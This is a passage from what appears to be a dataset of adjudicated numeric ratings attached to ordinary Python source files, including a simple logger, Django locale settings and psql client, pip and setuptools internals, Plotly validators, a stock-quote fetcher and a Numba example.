241	adjudicated	1	"""""""A simple log mechanism styled after PEP 282.""""""<<NEWL>><<NEWL>># The class here is styled after PEP 282 so that it could later be<<NEWL>># replaced with a standard Python logging implementation.<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>>DEBUG = 1<<NEWL>>INFO = 2<<NEWL>>WARN = 3<<NEWL>>ERROR = 4<<NEWL>>FATAL = 5<<NEWL>><<NEWL>><<NEWL>>class Log:<<NEWL>>    def __init__(self, threshold=WARN):<<NEWL>>        self.threshold = threshold<<NEWL>><<NEWL>>    def _log(self, level, msg, args):<<NEWL>>        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):<<NEWL>>            raise ValueError('%s wrong log level' % str(level))<<NEWL>><<NEWL>>        if level >= self.threshold:<<NEWL>>            if args:<<NEWL>>                msg = msg % args<<NEWL>>            if level in (WARN, ERROR, FATAL):<<NEWL>>                stream = sys.stderr<<NEWL>>            else:<<NEWL>>                stream = sys.stdout<<NEWL>>            try:<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            except UnicodeEncodeError:<<NEWL>>                # emulate backslashreplace error handler<<NEWL>>                encoding = stream.encoding<<NEWL>>                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            stream.flush()<<NEWL>><<NEWL>>    def log(self, level, msg, *args):<<NEWL>>        self._log(level, msg, args)<<NEWL>><<NEWL>>    def debug(self, msg, *args):<<NEWL>>        self._log(DEBUG, msg, args)<<NEWL>><<NEWL>>    def info(self, msg, *args):<<NEWL>>        self._log(INFO, msg, args)<<NEWL>><<NEWL>>    def warn(self, msg, *args):<<NEWL>>        self._log(WARN, msg, args)<<NEWL>><<NEWL>>    def error(self, msg, *args):<<NEWL>>        self._log(ERROR, msg, args)<<NEWL>><<NEWL>>    def fatal(self, msg, *args):<<NEWL>>        self._log(FATAL, msg, args)<<NEWL>><<NEWL>><<NEWL>>_global_log = Log()<<NEWL>>log = _global_log.log<<NEWL>>debug = _global_log.debug<<NEWL>>info = _global_log.info<<NEWL>>warn = _global_log.warn<<NEWL>>error = _global_log.error<<NEWL>>fatal = _global_log.fatal<<NEWL>><<NEWL>><<NEWL>>def set_threshold(level):<<NEWL>>    # return the old threshold for use from tests<<NEWL>>    old = _global_log.threshold<<NEWL>>    _global_log.threshold = level<<NEWL>>    return old<<NEWL>><<NEWL>><<NEWL>>def set_verbosity(v):<<NEWL>>    if v <= 0:<<NEWL>>        set_threshold(WARN)<<NEWL>>    elif v == 1:<<NEWL>>        set_threshold(INFO)<<NEWL>>    elif v >= 2:<<NEWL>>        set_threshold(DEBUG)"
90	adjudicated	0	"# Copyright 2016 Google Inc. All rights reserved.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import pytest<<NEWL>>import webtest<<NEWL>><<NEWL>>import guestbook<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def app(testbed):<<NEWL>>    return webtest.TestApp(guestbook.app)<<NEWL>><<NEWL>><<NEWL>>def test_get_guestbook_sync(app, testbed, login):<<NEWL>>    guestbook.Account(id='123').put()<<NEWL>>    # Log the user in<<NEWL>>    login(id='123')<<NEWL>><<NEWL>>    for i in range(11):<<NEWL>>        guestbook.Guestbook(content='Content {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/guestbook')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Content 1' in response.body<<NEWL>><<NEWL>><<NEWL>>def test_get_guestbook_async(app, testbed, login):<<NEWL>>    guestbook.Account(id='123').put()<<NEWL>>    # Log the user in<<NEWL>>    login(id='123')<<NEWL>>    for i in range(11):<<NEWL>>        guestbook.Guestbook(content='Content {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/guestbook?async=1')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Content 1' in response.body<<NEWL>><<NEWL>><<NEWL>>def test_get_messages_sync(app, testbed):<<NEWL>>    for i in range(21):<<NEWL>>        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()<<NEWL>>        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/messages')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Nick 1 wrote:' in response.body<<NEWL>>    assert '<p>Text 1' in response.body<<NEWL>><<NEWL>><<NEWL>>def test_get_messages_async(app, testbed):<<NEWL>>    for i in range(21):<<NEWL>>        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()<<NEWL>>        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/messages?async=1')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Nick 1 wrote:' in response.body<<NEWL>>    assert '\nText 1' in response.body"
301	adjudicated	4	# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = r'Y. \g\a\d\a j. F'<<NEWL>>TIME_FORMAT = 'H:i'<<NEWL>>DATETIME_FORMAT = r'Y. \g\a\d\a j. F, H:i'<<NEWL>>YEAR_MONTH_FORMAT = r'Y. \g. F'<<NEWL>>MONTH_DAY_FORMAT = 'j. F'<<NEWL>>SHORT_DATE_FORMAT = r'j.m.Y'<<NEWL>>SHORT_DATETIME_FORMAT = 'j.m.Y H:i'<<NEWL>>FIRST_DAY_OF_WEEK = 1  # Monday<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d', '%d.%m.%Y', '%d.%m.%y',  # '2006-10-25', '25.10.2006', '25.10.06'<<NEWL>>]<<NEWL>>TIME_INPUT_FORMATS = [<<NEWL>>    '%H:%M:%S',     # '14:30:59'<<NEWL>>    '%H:%M:%S.%f',  # '14:30:59.000200'<<NEWL>>    '%H:%M',        # '14:30'<<NEWL>>    '%H.%M.%S',     # '14.30.59'<<NEWL>>    '%H.%M.%S.%f',  # '14.30.59.000200'<<NEWL>>    '%H.%M',        # '14.30'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'<<NEWL>>    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'<<NEWL>>    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'<<NEWL>>    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'<<NEWL>>    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'<<NEWL>>    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'<<NEWL>>    '%d.%m.%y %H:%M',        # '25.10.06 14:30'<<NEWL>>    '%d.%m.%y %H.%M.%S',     # '25.10.06 14.30.59'<<NEWL>>    '%d.%m.%y %H.%M.%S.%f',  # '25.10.06 14.30.59.000200'<<NEWL>>    '%d.%m.%y %H.%M',        # '25.10.06 14.30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = ','<<NEWL>>THOUSAND_SEPARATOR = ' '  # Non-breaking space<<NEWL>>NUMBER_GROUPING = 3
181	adjudicated	3	"from typing import Optional<<NEWL>><<NEWL>>from pip._internal.models.format_control import FormatControl<<NEWL>><<NEWL>><<NEWL>>class SelectionPreferences:<<NEWL>>    """"""<<NEWL>>    Encapsulates the candidate selection preferences for downloading<<NEWL>>    and installing files.<<NEWL>>    """"""<<NEWL>><<NEWL>>    __slots__ = [<<NEWL>>        ""allow_yanked"",<<NEWL>>        ""allow_all_prereleases"",<<NEWL>>        ""format_control"",<<NEWL>>        ""prefer_binary"",<<NEWL>>        ""ignore_requires_python"",<<NEWL>>    ]<<NEWL>><<NEWL>>    # Don't include an allow_yanked default value to make sure each call<<NEWL>>    # site considers whether yanked releases are allowed. This also causes<<NEWL>>    # that decision to be made explicit in the calling code, which helps<<NEWL>>    # people when reading the code.<<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        allow_yanked: bool,<<NEWL>>        allow_all_prereleases: bool = False,<<NEWL>>        format_control: Optional[FormatControl] = None,<<NEWL>>        prefer_binary: bool = False,<<NEWL>>        ignore_requires_python: Optional[bool] = None,<<NEWL>>    ) -> None:<<NEWL>>        """"""Create a SelectionPreferences object.<<NEWL>><<NEWL>>        :param allow_yanked: Whether files marked as yanked (in the sense<<NEWL>>            of PEP 592) are permitted to be candidates for install.<<NEWL>>        :param format_control: A FormatControl object or None. Used to control<<NEWL>>            the selection of source packages / binary packages when consulting<<NEWL>>            the index and links.<<NEWL>>        :param prefer_binary: Whether to prefer an old, but valid, binary<<NEWL>>            dist over a new source dist.<<NEWL>>        :param ignore_requires_python: Whether to ignore incompatible<<NEWL>>            ""Requires-Python"" values in links. Defaults to False.<<NEWL>>        """"""<<NEWL>>        if ignore_requires_python is None:<<NEWL>>            ignore_requires_python = False<<NEWL>><<NEWL>>        self.allow_yanked = allow_yanked<<NEWL>>        self.allow_all_prereleases = allow_all_prereleases<<NEWL>>        self.format_control = format_control<<NEWL>>        self.prefer_binary = prefer_binary<<NEWL>>        self.ignore_requires_python = ignore_requires_python"
210	adjudicated	1	"""""""A simple log mechanism styled after PEP 282.""""""<<NEWL>><<NEWL>># The class here is styled after PEP 282 so that it could later be<<NEWL>># replaced with a standard Python logging implementation.<<NEWL>><<NEWL>>DEBUG = 1<<NEWL>>INFO = 2<<NEWL>>WARN = 3<<NEWL>>ERROR = 4<<NEWL>>FATAL = 5<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>>class Log:<<NEWL>><<NEWL>>    def __init__(self, threshold=WARN):<<NEWL>>        self.threshold = threshold<<NEWL>><<NEWL>>    def _log(self, level, msg, args):<<NEWL>>        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):<<NEWL>>            raise ValueError('%s wrong log level' % str(level))<<NEWL>><<NEWL>>        if level >= self.threshold:<<NEWL>>            if args:<<NEWL>>                msg = msg % args<<NEWL>>            if level in (WARN, ERROR, FATAL):<<NEWL>>                stream = sys.stderr<<NEWL>>            else:<<NEWL>>                stream = sys.stdout<<NEWL>>            try:<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            except UnicodeEncodeError:<<NEWL>>                # emulate backslashreplace error handler<<NEWL>>                encoding = stream.encoding<<NEWL>>                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            stream.flush()<<NEWL>><<NEWL>>    def log(self, level, msg, *args):<<NEWL>>        self._log(level, msg, args)<<NEWL>><<NEWL>>    def debug(self, msg, *args):<<NEWL>>        self._log(DEBUG, msg, args)<<NEWL>><<NEWL>>    def info(self, msg, *args):<<NEWL>>        self._log(INFO, msg, args)<<NEWL>><<NEWL>>    def warn(self, msg, *args):<<NEWL>>        self._log(WARN, msg, args)<<NEWL>><<NEWL>>    def error(self, msg, *args):<<NEWL>>        self._log(ERROR, msg, args)<<NEWL>><<NEWL>>    def fatal(self, msg, *args):<<NEWL>>        self._log(FATAL, msg, args)<<NEWL>><<NEWL>>_global_log = Log()<<NEWL>>log = _global_log.log<<NEWL>>debug = _global_log.debug<<NEWL>>info = _global_log.info<<NEWL>>warn = _global_log.warn<<NEWL>>error = _global_log.error<<NEWL>>fatal = _global_log.fatal<<NEWL>><<NEWL>>def set_threshold(level):<<NEWL>>    # return the old threshold for use from tests<<NEWL>>    old = _global_log.threshold<<NEWL>>    _global_log.threshold = level<<NEWL>>    return old<<NEWL>><<NEWL>>def set_verbosity(v):<<NEWL>>    if v <= 0:<<NEWL>>        set_threshold(WARN)<<NEWL>>    elif v == 1:<<NEWL>>        set_threshold(INFO)<<NEWL>>    elif v >= 2:<<NEWL>>        set_threshold(DEBUG)"
350	adjudicated	1	import os<<NEWL>>import signal<<NEWL>>import subprocess<<NEWL>><<NEWL>>from django.db.backends.base.client import BaseDatabaseClient<<NEWL>><<NEWL>><<NEWL>>class DatabaseClient(BaseDatabaseClient):<<NEWL>>    executable_name = 'psql'<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def runshell_db(cls, conn_params, parameters):<<NEWL>>        args = [cls.executable_name]<<NEWL>><<NEWL>>        host = conn_params.get('host', '')<<NEWL>>        port = conn_params.get('port', '')<<NEWL>>        dbname = conn_params.get('database', '')<<NEWL>>        user = conn_params.get('user', '')<<NEWL>>        passwd = conn_params.get('password', '')<<NEWL>>        sslmode = conn_params.get('sslmode', '')<<NEWL>>        sslrootcert = conn_params.get('sslrootcert', '')<<NEWL>>        sslcert = conn_params.get('sslcert', '')<<NEWL>>        sslkey = conn_params.get('sslkey', '')<<NEWL>><<NEWL>>        if user:<<NEWL>>            args += ['-U', user]<<NEWL>>        if host:<<NEWL>>            args += ['-h', host]<<NEWL>>        if port:<<NEWL>>            args += ['-p', str(port)]<<NEWL>>        args += [dbname]<<NEWL>>        args.extend(parameters)<<NEWL>><<NEWL>>        sigint_handler = signal.getsignal(signal.SIGINT)<<NEWL>>        subprocess_env = os.environ.copy()<<NEWL>>        if passwd:<<NEWL>>            subprocess_env['PGPASSWORD'] = str(passwd)<<NEWL>>        if sslmode:<<NEWL>>            subprocess_env['PGSSLMODE'] = str(sslmode)<<NEWL>>        if sslrootcert:<<NEWL>>            subprocess_env['PGSSLROOTCERT'] = str(sslrootcert)<<NEWL>>        if sslcert:<<NEWL>>            subprocess_env['PGSSLCERT'] = str(sslcert)<<NEWL>>        if sslkey:<<NEWL>>            subprocess_env['PGSSLKEY'] = str(sslkey)<<NEWL>>        try:<<NEWL>>            # Allow SIGINT to pass to psql to abort queries.<<NEWL>>            signal.signal(signal.SIGINT, signal.SIG_IGN)<<NEWL>>            subprocess.run(args, check=True, env=subprocess_env)<<NEWL>>        finally:<<NEWL>>            # Restore the original SIGINT handler.<<NEWL>>            signal.signal(signal.SIGINT, sigint_handler)<<NEWL>><<NEWL>>    def runshell(self, parameters):<<NEWL>>        self.runshell_db(self.connection.get_connection_params(), parameters)
172	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class LineValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""line"", parent_name=""scattersmith"", **kwargs):<<NEWL>>        super(LineValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Line""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            backoff<<NEWL>>                Sets the line back off from the end point of<<NEWL>>                the nth line segment (in px). This option is<<NEWL>>                useful e.g. to avoid overlap with arrowhead<<NEWL>>                markers. With ""auto"" the lines would trim<<NEWL>>                before markers if `marker.angleref` is set to<<NEWL>>                ""previous"".<<NEWL>>            backoffsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `backoff`.<<NEWL>>            color<<NEWL>>                Sets the line color.<<NEWL>>            dash<<NEWL>>                Sets the dash style of lines. Set to a dash<<NEWL>>                type string (""solid"", ""dot"", ""dash"",<<NEWL>>                ""longdash"", ""dashdot"", or ""longdashdot"") or a<<NEWL>>                dash length list in px (eg ""5px,10px,2px,2px"").<<NEWL>>            shape<<NEWL>>                Determines the line shape. With ""spline"" the<<NEWL>>                lines are drawn using spline interpolation. The<<NEWL>>                other available values correspond to step-wise<<NEWL>>                line shapes.<<NEWL>>            smoothing<<NEWL>>                Has an effect only if `shape` is set to<<NEWL>>                ""spline"" Sets the amount of smoothing. 0<<NEWL>>                corresponds to no smoothing (equivalent to a<<NEWL>>                ""linear"" shape).<<NEWL>>            width<<NEWL>>                Sets the line width (in px).<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
32	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class OutsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""outsidetextfont"", parent_name=""funnel"", **kwargs):<<NEWL>>        super(OutsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Outsidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
123	adjudicated	0	"import requests<<NEWL>>import re<<NEWL>>import json<<NEWL>>from urllib.parse import urlencode<<NEWL>><<NEWL>><<NEWL>>def convert_secid(secid: str) -> str:<<NEWL>>    if secid[0] == '6' or secid[0] == '5':<<NEWL>>        return f'1.{secid}'<<NEWL>>    return f'0.{secid}'<<NEWL>><<NEWL>><<NEWL>>def fetch_close_price(secid: str) -> float:<<NEWL>>    secid = convert_secid(secid)<<NEWL>><<NEWL>>    headers = {<<NEWL>>        ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0""<<NEWL>>    }<<NEWL>><<NEWL>>    base_url = ""http://push2.eastmoney.com/api/qt/stock/get""<<NEWL>><<NEWL>>    parameters = (<<NEWL>>        (""invt"", 2),<<NEWL>>        (""fltt"", 1),<<NEWL>>        (""cb"", ""jQuery3510768790004533975_1671331577142""),<<NEWL>>        (""fields"", ""f58,f734,f107,f57,f43,f59,f169,f170,f152,f177,f111,f46,f60,f44,f45,f47,f260,f48,f261,f279,f277,f278,f288,f19,f17,f531,f15,f13,f11,f20,f18,f16,f14,f12,f39,f37,f35,f33,f31,f40,f38,f36,f34,f32,f211,f212,f213,f214,f215,f210,f209,f208,f207,f206,f161,f49,f171,f50,f86,f84,f85,f168,f108,f116,f167,f164,f162,f163,f92,f71,f117,f292,f51,f52,f191,f192,f262""),<<NEWL>>        (""secid"", secid),<<NEWL>>        (""ut"", ""fa5fd1943c7b386f172d6893dbfba10b""),<<NEWL>>        (""wbp2u"", ""|0|0|0|web""),<<NEWL>>        (""_"", ""1671331577143""),<<NEWL>>    )<<NEWL>><<NEWL>>    url = base_url + '?' + urlencode(parameters)<<NEWL>><<NEWL>>    resp = requests.get(url, headers=headers)<<NEWL>>    if resp.status_code == requests.codes.ok:<<NEWL>>        try:<<NEWL>>            jq = resp.content.decode('utf-8')<<NEWL>>            p = re.compile(""jQuery[0-9_(]+(.*)\);"")<<NEWL>>            m = p.match(jq)<<NEWL>>            js = json.loads(m.group(1))<<NEWL>>            close_price_int = int(js[""data""][""f43""])<<NEWL>>            precision = int(js[""data""][""f59""])<<NEWL>>            close_price = close_price_int / pow(10, precision)<<NEWL>>            return close_price<<NEWL>>        except:<<NEWL>>            print(f""url = {url}"")<<NEWL>>            print(f""resp = {resp.content}"")<<NEWL>>    else:<<NEWL>>        print(f""url = {url}"")<<NEWL>>        print(f""status = {resp.status_code}"")<<NEWL>><<NEWL>>"
63	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class SymbolValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""symbol"", parent_name=""layout.mapbox.layer"", **kwargs<<NEWL>>    ):<<NEWL>>        super(SymbolValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Symbol""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            icon<<NEWL>>                Sets the symbol icon image<<NEWL>>                (mapbox.layer.layout.icon-image). Full list:<<NEWL>>                https://www.mapbox.com/maki-icons/<<NEWL>>            iconsize<<NEWL>>                Sets the symbol icon size<<NEWL>>                (mapbox.layer.layout.icon-size). Has an effect<<NEWL>>                only when `type` is set to ""symbol"".<<NEWL>>            placement<<NEWL>>                Sets the symbol and/or text placement<<NEWL>>                (mapbox.layer.layout.symbol-placement). If<<NEWL>>                `placement` is ""point"", the label is placed<<NEWL>>                where the geometry is located If `placement` is<<NEWL>>                ""line"", the label is placed along the line of<<NEWL>>                the geometry If `placement` is ""line-center"",<<NEWL>>                the label is placed on the center of the<<NEWL>>                geometry<<NEWL>>            text<<NEWL>>                Sets the symbol text (mapbox.layer.layout.text-<<NEWL>>                field).<<NEWL>>            textfont<<NEWL>>                Sets the icon text font<<NEWL>>                (color=mapbox.layer.paint.text-color,<<NEWL>>                size=mapbox.layer.layout.text-size). Has an<<NEWL>>                effect only when `type` is set to ""symbol"".<<NEWL>>            textposition<<NEWL>>                Sets the positions of the `text` elements with<<NEWL>>                respects to the (x,y) coordinates.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
364	adjudicated	1	import numpy as np<<NEWL>>import numba as nb<<NEWL>><<NEWL>>from numpy.random import PCG64<<NEWL>>from timeit import timeit<<NEWL>><<NEWL>>bit_gen = PCG64()<<NEWL>>next_d = bit_gen.cffi.next_double<<NEWL>>state_addr = bit_gen.cffi.state_address<<NEWL>><<NEWL>>def normals(n, state):<<NEWL>>    out = np.empty(n)<<NEWL>>    for i in range((n + 1) // 2):<<NEWL>>        x1 = 2.0 * next_d(state) - 1.0<<NEWL>>        x2 = 2.0 * next_d(state) - 1.0<<NEWL>>        r2 = x1 * x1 + x2 * x2<<NEWL>>        while r2 >= 1.0 or r2 == 0.0:<<NEWL>>            x1 = 2.0 * next_d(state) - 1.0<<NEWL>>            x2 = 2.0 * next_d(state) - 1.0<<NEWL>>            r2 = x1 * x1 + x2 * x2<<NEWL>>        f = np.sqrt(-2.0 * np.log(r2) / r2)<<NEWL>>        out[2 * i] = f * x1<<NEWL>>        if 2 * i + 1 < n:<<NEWL>>            out[2 * i + 1] = f * x2<<NEWL>>    return out<<NEWL>><<NEWL>># Compile using Numba<<NEWL>>normalsj = nb.jit(normals, nopython=True)<<NEWL>># Must use state address not state with numba<<NEWL>>n = 10000<<NEWL>><<NEWL>>def numbacall():<<NEWL>>    return normalsj(n, state_addr)<<NEWL>><<NEWL>>rg = np.random.Generator(PCG64())<<NEWL>><<NEWL>>def numpycall():<<NEWL>>    return rg.normal(size=n)<<NEWL>><<NEWL>># Check that the functions work<<NEWL>>r1 = numbacall()<<NEWL>>r2 = numpycall()<<NEWL>>assert r1.shape == (n,)<<NEWL>>assert r1.shape == r2.shape<<NEWL>><<NEWL>>t1 = timeit(numbacall, number=1000)<<NEWL>>print(f'{t1:.2f} secs for {n} PCG64 (Numba/PCG64) gaussian randoms')<<NEWL>>t2 = timeit(numpycall, number=1000)<<NEWL>>print(f'{t2:.2f} secs for {n} PCG64 (NumPy/PCG64) gaussian randoms')<<NEWL>><<NEWL>># example 2<<NEWL>><<NEWL>>next_u32 = bit_gen.ctypes.next_uint32<<NEWL>>ctypes_state = bit_gen.ctypes.state<<NEWL>><<NEWL>>@nb.jit(nopython=True)<<NEWL>>def bounded_uint(lb, ub, state):<<NEWL>>    mask = delta = ub - lb<<NEWL>>    mask |= mask >> 1<<NEWL>>    mask |= mask >> 2<<NEWL>>    mask |= mask >> 4<<NEWL>>    mask |= mask >> 8<<NEWL>>    mask |= mask >> 16<<NEWL>><<NEWL>>    val = next_u32(state) & mask<<NEWL>>    while val > delta:<<NEWL>>        val = next_u32(state) & mask<<NEWL>><<NEWL>>    return lb + val<<NEWL>><<NEWL>><<NEWL>>print(bounded_uint(323, 2394691, ctypes_state.value))<<NEWL>><<NEWL>><<NEWL>>@nb.jit(nopython=True)<<NEWL>>def bounded_uints(lb, ub, n, state):<<NEWL>>    out = np.empty(n, dtype=np.uint32)<<NEWL>>    for i in range(n):<<NEWL>>        out[i] = bounded_uint(lb, ub, state)<<NEWL>><<NEWL>><<NEWL>>bounded_uints(323, 2394691, 10000000, ctypes_state.value)<<NEWL>><<NEWL>>
224	adjudicated	4	"""""""Fix the name of modules<<NEWL>><<NEWL>>This module is useful when you want to rename many of the modules in<<NEWL>>your project.  That can happen specially when you want to change their<<NEWL>>naming style.<<NEWL>><<NEWL>>For instance::<<NEWL>><<NEWL>>  fixer = FixModuleNames(project)<<NEWL>>  changes = fixer.get_changes(fixer=str.lower)<<NEWL>>  project.do(changes)<<NEWL>><<NEWL>>Here it renames all modules and packages to use lower-cased chars.<<NEWL>>You can tell it to use any other style by using the ``fixer``<<NEWL>>argument.<<NEWL>><<NEWL>>""""""<<NEWL>>from rope.base import taskhandle<<NEWL>>from rope.contrib import changestack<<NEWL>>from rope.refactor import rename<<NEWL>><<NEWL>><<NEWL>>class FixModuleNames:<<NEWL>>    def __init__(self, project):<<NEWL>>        self.project = project<<NEWL>><<NEWL>>    def get_changes(self, fixer=str.lower, task_handle=taskhandle.DEFAULT_TASK_HANDLE):<<NEWL>>        """"""Fix module names<<NEWL>><<NEWL>>        `fixer` is a function that takes and returns a `str`.  Given<<NEWL>>        the name of a module, it should return the fixed name.<<NEWL>><<NEWL>>        """"""<<NEWL>>        stack = changestack.ChangeStack(self.project, ""Fixing module names"")<<NEWL>>        jobset = task_handle.create_jobset(<<NEWL>>            ""Fixing module names"", self._count_fixes(fixer) + 1<<NEWL>>        )<<NEWL>>        try:<<NEWL>>            while True:<<NEWL>>                for resource in self._tobe_fixed(fixer):<<NEWL>>                    jobset.started_job(resource.path)<<NEWL>>                    renamer = rename.Rename(self.project, resource)<<NEWL>>                    changes = renamer.get_changes(fixer(self._name(resource)))<<NEWL>>                    stack.push(changes)<<NEWL>>                    jobset.finished_job()<<NEWL>>                    break<<NEWL>>                else:<<NEWL>>                    break<<NEWL>>        finally:<<NEWL>>            jobset.started_job(""Reverting to original state"")<<NEWL>>            stack.pop_all()<<NEWL>>            jobset.finished_job()<<NEWL>>        return stack.merged()<<NEWL>><<NEWL>>    def _count_fixes(self, fixer):<<NEWL>>        return len(list(self._tobe_fixed(fixer)))<<NEWL>><<NEWL>>    def _tobe_fixed(self, fixer):<<NEWL>>        for resource in self.project.get_python_files():<<NEWL>>            modname = self._name(resource)<<NEWL>>            if modname != fixer(modname):<<NEWL>>                yield resource<<NEWL>><<NEWL>>    def _name(self, resource):<<NEWL>>        modname = resource.name.rsplit(""."", 1)[0]<<NEWL>>        if modname == ""__init__"":<<NEWL>>            modname = resource.parent.name<<NEWL>>        return modname"
335	adjudicated	3	"import functools<<NEWL>>import operator<<NEWL>>import itertools<<NEWL>><<NEWL>>from .extern.jaraco.text import yield_lines<<NEWL>>from .extern.jaraco.functools import pass_none<<NEWL>>from ._importlib import metadata<<NEWL>>from ._itertools import ensure_unique<<NEWL>>from .extern.more_itertools import consume<<NEWL>><<NEWL>><<NEWL>>def ensure_valid(ep):<<NEWL>>    """"""<<NEWL>>    Exercise one of the dynamic properties to trigger<<NEWL>>    the pattern match.<<NEWL>>    """"""<<NEWL>>    ep.extras<<NEWL>><<NEWL>><<NEWL>>def load_group(value, group):<<NEWL>>    """"""<<NEWL>>    Given a value of an entry point or series of entry points,<<NEWL>>    return each as an EntryPoint.<<NEWL>>    """"""<<NEWL>>    # normalize to a single sequence of lines<<NEWL>>    lines = yield_lines(value)<<NEWL>>    text = f'[{group}]\n' + '\n'.join(lines)<<NEWL>>    return metadata.EntryPoints._from_text(text)<<NEWL>><<NEWL>><<NEWL>>def by_group_and_name(ep):<<NEWL>>    return ep.group, ep.name<<NEWL>><<NEWL>><<NEWL>>def validate(eps: metadata.EntryPoints):<<NEWL>>    